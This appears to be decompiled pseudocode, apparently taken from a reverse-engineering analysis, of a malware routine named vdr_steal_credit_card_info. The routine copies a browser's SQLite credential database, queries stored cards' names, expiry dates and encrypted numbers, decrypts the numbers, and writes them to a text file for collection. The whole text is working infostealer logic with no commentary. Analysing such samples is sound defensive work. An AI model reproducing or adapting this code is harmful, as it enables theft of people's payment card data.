// #STR: "Name:", "Month:", "Year:", "Card:", "\\CC\\%s_%s.txt"
BOOL __thiscall vdr_steal_credit_card_info(void *this, const char *a2, const char *a3, int a4, int a5, VDR_FILE_STRUC *file_struc)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  v20 = a2;
  lpString2 = a3;
  memset(String1, 0, sizeof(String1));
  lstrcatA(String1, str_C_ProgramData);
  str_rand = vdr_gen_random_buffer_based_on_tickcount_seed(0x1Au);
  lstrcatA(String1, str_rand);
  CopyFileA(this, String1, 1);
  memset(sz_credit_card_path, 0, sizeof(sz_credit_card_path));
  wsprintfA(sz_credit_card_path, "\\CC\\%s_%s.txt", a3, a2);
  // SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards
  str_query_command = str_SELECT_name_on_card;
  if ( str_sqlite3_open_0(String1, &v18) )
  {
    return DeleteFileA(String1);
  }
  if ( !str_sqlite3_prepare_v2_0(v18, str_query_command, 0xFFFFFFFF, &stmt, 0) )
  {
    curr_proc_heap = GetProcessHeap_1();
    str_collected_info = HeapAlloc_1(curr_proc_heap, v16, v17);
    while ( str_sqlite3_step_0(stmt) == 0x64 )
    {
      v10 = str_sqlite3_column_text_0(stmt, 0);
      lpString2 = str_sqlite3_column_text_0(stmt, 1);
      v20 = str_sqlite3_column_text_0(stmt, 2);
      lstrcatA(str_collected_info, "Name: ");
      lstrcatA(str_collected_info, v10);
      lstrcatA(str_collected_info, L"\n");
      lstrcatA(str_collected_info, "Month: ");
      lstrcatA(str_collected_info, lpString2);
      lstrcatA(str_collected_info, L"\n");
      lstrcatA(str_collected_info, "Year: ");
      lstrcatA(str_collected_info, v20);
      lstrcatA(str_collected_info, L"\n");
      lstrcatA(str_collected_info, "Card: ");
      v15 = str_sqlite3_column_bytes_0(stmt, 3);
      v11 = str_sqlite3_column_blob_0(stmt, 3);
      v12 = sub_40FD13(v23, a5, v11, v15, a4);
      v26 = 0;
      if ( *(v12 + 5) >= 0x10u )
      {
        v12 = *v12;
      }
      lstrcatA(str_collected_info, v12);
      v26 = 0xFFFFFFFF;
      std::string::_Tidy(v23, 1, 0);
      lstrcatA(str_collected_info, "\n\n");
    }
    v13 = lstrlenA(str_collected_info);
    vdr_create_file(file_struc, str_collected_info, sz_credit_card_path, v13, 3);
    memset(&str_collected_info, 0, sizeof(str_collected_info));
  }
  str_sqlite3_finalize_0(stmt);
  str_sqlite3_close_0(v18);
  return DeleteFileA(String1);
}
